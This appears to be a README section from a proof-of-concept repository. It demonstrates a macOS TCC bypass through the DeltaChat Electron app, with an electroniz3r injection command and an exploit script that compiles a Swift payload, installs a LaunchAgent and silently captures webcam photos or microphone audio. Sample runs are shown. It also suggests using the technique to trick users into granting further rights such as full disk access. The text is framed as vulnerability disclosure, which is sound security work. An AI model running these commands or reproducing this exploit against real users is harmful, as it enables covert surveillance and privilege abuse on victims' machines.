# Exploitation

Showing a few ways to exploit this vulnerability, also showing a "new" vulnerability/technique with TCC that _can_ be useful for tricking a user for more TCC rights, e.g. full disk access or any other TCC rights. 

>**Note:** When running this proof-of-concept, the Terminal app does not need a prompt for camera access. This is because the camera permission is granted to DeltaChat, and the injected code inherits those permissions, effectively bypassing macOS TCC restrictions.

### Automated 

Run the following from Terminal using [electroniz3r](https://github.com/r3ggi/electroniz3r)

```sh
electroniz3r inject /Applications/DeltaChat.app/ --predefined-script takeSelfie
```

Sample output:
```sh
/Applications/DeltaChat.app/ started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/56264727-4473-4393-b712-7e24c65a1c71
Check /tmp/selfie.jpg
```

Confirm the result by running:
```sh
open /tmp/selfie.jpg
```

<img width="1502" height="470" alt="poc-delta" src="https://github.com/user-attachments/assets/6bcc6604-8707-4924-89c8-2d8985aab39e" />

A picture is taken using the system webcam, without Terminal having any camera access this demonstrates a successful TCC bypass.

### Bash Script 

Clone the repository and then execute the bash script, the bash script autoexploits the TCC Bypass, then you can choose between exploiting camera or microphone TCC bypass. 

Execute bash script:
```sh
bash full_exploit.sh
# or
chmod +x full_exploit.sh && ./full_exploit.sh
```

Example output camera: (auto opens the selfie)
```sh
kunpeeks@MacBook-Pro-van-Kun % bash exploit.sh 
[*] Choose the TCC resource to access:
    1. Camera (take selfie)
    2. Microphone (record 5 sec)
[?] Enter choice (1 or 2): 1
[*] Generating Swift payload...
[*] Mode: Camera (selfie)
[*] Compiling Swift payload to /Users/kunpeeks/Desktop/tcc_payload
[*] Writing LaunchAgent to /Users/kunpeeks/Library/LaunchAgents/com.deltachat.tcc.bypass.plist
[*] Triggering DeltaChat exploit via launchctl...
[*] Waiting for payload to complete...
[+] Selfie taken! Opening...
```

Example output microphone: (does not auto open the recording file, I'm too lazy too fix it)
```sh
kunpeeks@MacBook-Pro-van-Kun 2 % bash exploit.sh
[*] Choose the TCC resource to access:
    1. Camera (take selfie)
    2. Microphone (record 5 sec)
[?] Enter choice (1 or 2): 2
[*] Generating Swift payload...
[*] Mode: Microphone (5 sec recording)
[*] Compiling Swift payload to /Users/kunpeeks/Desktop/tcc_payload
[*] Writing LaunchAgent to /Users/kunpeeks/Library/LaunchAgents/com.deltachat.tcc.bypass.plist
[*] Triggering DeltaChat exploit via launchctl...
[*] Waiting for payload to complete...
[+] Audio recording complete! Playing...
Error: AudioFileOpen failed ('dta?')
```

The recorded 5s audio file is located in `/tmp/recording.m4a`. 






